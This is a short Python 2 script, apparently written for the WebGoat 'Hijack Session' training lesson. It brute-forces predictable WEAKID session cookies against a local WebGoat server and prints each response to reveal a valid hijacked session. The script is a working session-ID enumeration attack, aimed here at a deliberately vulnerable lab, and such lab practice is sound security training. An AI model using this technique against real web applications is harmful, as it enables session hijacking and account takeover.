'''
Fuzzer for weak session ID (WebGoat Hijack Session level)

'''

import httplib

if __name__ == "__main__":
    httpServ = httplib.HTTPConnection("127.0.0.1", 80)

    httpServ.connect()

    for wid in range(300, 400):
        weakid = "10991--1461500313%s" % wid

        headers = {"Host": "localhost",
                   "Proxy-Connection": "keep-alive",
                   "Content-length": "69",
                   "Cache-Control": "max-age=0",
                   "Origin": "http://localhost",
                   "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                   "Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Referer": "http://localhost/WebGoat/attack?Screen=730&menu=1800",
                   "Accept-Encoding": "gzip,deflate,sdch",
                   "Accept-Language": "en-US,en;q=0.8",
                   "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.3",
                   "Cookie": "JSESSIONID=338F86DBB1A13DEF4FB3858982455BA3; WEAKID=%s" % weakid,
                   "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="}
        httpServ.request('POST',
                         '/WebGoat/attack?Screen=192&menu=1700',
                         'Username=guest&Password=guest&WEAKID=%s&SUBMIT=Login' % weakid,
                         headers)

        response = httpServ.getresponse()
        print "weakid: ", weakid
        print response.read()

        httpServ.close()